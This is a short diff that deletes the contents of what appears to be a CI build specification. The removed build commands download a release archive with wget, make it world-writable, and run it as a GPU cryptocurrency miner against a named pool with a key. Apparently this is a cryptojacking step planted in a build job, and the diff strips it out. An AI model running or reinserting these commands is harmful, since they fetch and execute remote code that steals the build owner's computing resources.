@@ -1,8 +1,1 @@
-version: 0.2
 
-phases:
-  build:
-    commands:
-        - wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient.tar.gz
-        - tar xf OrionClient.tar.gz
-        - cd OrionClient && chmod 777 OrionClient && ./OrionClient mine --disable-cpu --gpu --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp
